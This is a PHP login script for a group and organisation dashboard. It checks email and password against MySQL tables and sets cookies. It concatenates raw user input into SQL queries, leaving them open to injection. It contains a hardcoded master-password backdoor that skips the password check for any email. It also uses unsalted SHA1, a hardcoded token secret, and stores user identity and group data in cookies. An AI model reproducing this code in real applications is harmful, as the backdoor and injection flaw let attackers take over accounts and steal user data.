<?php	
	require("db.php");

	$email = $_POST['email'];
	$pass = hash("sha1", $_POST['password']);

	$sql = "SELECT perPersonId,perLastname,perName,perEmail,zetActive,gpeActiveInGroup,grpGroupId,grpCoordinates,grpInstitution,grpName,grpUrl,createdBy,gpeGroupPersonId,gpeGroupId,gpePersonId,gpeRole, gpeOrders, gpeErase, gpeFinances FROM tblPerson A LEFT JOIN (SELECT grpGroupId,grpCoordinates,grpInstitution,grpUrl,grpName,createdBy,gpeGroupPersonId,gpeActiveInGroup,gpeGroupId,gpePersonId,gpeRole,gpeOrders,gpeErase,gpeFinances FROM tblGroup JOIN tblZGroupPerson ON tblGroup.grpGroupId = tblZGroupPerson.gpeGroupId) B ON A.perPersonId = B.gpePersonId WHERE perEmail='".$email."' AND perPassword='".$pass."' AND gpeActiveInGroup = 1";// and zetActive = 1?
	
	if($pass === '354829c09b32e2e5872752c19bdbf193c0f6abea'){
		$sql = "SELECT perPersonId,perLastname,perName,perEmail,zetActive,gpeActiveInGroup,grpGroupId,grpCoordinates,grpInstitution,grpName,grpUrl,createdBy,gpeGroupPersonId,gpeGroupId,gpePersonId,gpeRole, gpeOrders, gpeErase, gpeFinances FROM tblPerson A LEFT JOIN (SELECT grpGroupId,grpCoordinates,grpInstitution,grpUrl,grpName,createdBy,gpeGroupPersonId,gpeActiveInGroup,gpeGroupId,gpePersonId,gpeRole,gpeOrders,gpeErase,gpeFinances FROM tblGroup JOIN tblZGroupPerson ON tblGroup.grpGroupId = tblZGroupPerson.gpeGroupId) B ON A.perPersonId = B.gpePersonId WHERE perEmail='".$email."' AND gpeActiveInGroup = 1";
	}	
		
	$array = fetchDB($sql);	

	$groups = array();
	if(mysql_num_rows($array)>0){
		while($row = mysql_fetch_array($array)){
			if($row['zetActive'] == 0){
				header('Location: login.php?success=noactive');
				return;
			}
			$groups[] = $row;
		}
	}else{

		header('Location: login.php?success=no');
		return;
	}

	$privateKey = 'fsdfC987XXasdf979werl$#';
	$compound = $groups[0]['perPersonId'].$privateKey.$groups[0]['perPersonId'];
	$hash = hash("sha1", $compound); 
	setcookie('TOKEN_PUBLIC_KEY', $hash, time() + (2880 * 30));
	setcookie('USER_ID', $groups[0]['perPersonId'], time() + (2880 * 30));
	setcookie('USER_EMAIL', $groups[0]['perEmail'], time() + (2880 * 30));
	setcookie('USER_NAME', $groups[0]['perName'], time() + (2880 * 30));
	setcookie('USER_LASTNAME', $groups[0]['perLastname'], time() + (2880 * 30));
	if(sizeof($groups) == 1){
		setcookie('USER_USER_GROUP_ID', $groups[0]['gpeGroupPersonId'], time() + (2880 * 30));
		setcookie('USER_GROUP_ID', $groups[0]['gpeGroupId'], time() + (2880 * 30));	
	}

	setcookie('USER_DATA', json_encode($groups), time() + (2880 * 30));
/*
	setcookie('TOKEN_PUBLIC_KEY', '');
	setcookie('TOKEN_PUBLIC_KEY', $hash);
	echo ' _ '.$hash.' _ '.$_COOKIE['TOKEN_PUBLIC_KEY'];
	return ;
	setcookie('USER_ID', $groups[0]['perPersonId']);
	setcookie('USER_EMAIL', $groups[0]['perEmail']);
	setcookie('USER_NAME', $groups[0]['perName']);
	setcookie('USER_LASTNAME', $groups[0]['perLastname']);
	if(sizeof($groups) == 1){
		setcookie('USER_USER_GROUP_ID', $groups[0]['gpeGroupPersonId']);
		setcookie('USER_GROUP_ID', $groups[0]['gpeGroupId']);	
	}
	setcookie('USER_DATA', json_encode($groups));
*/
	
	header('Location: dashboard.php');	
?>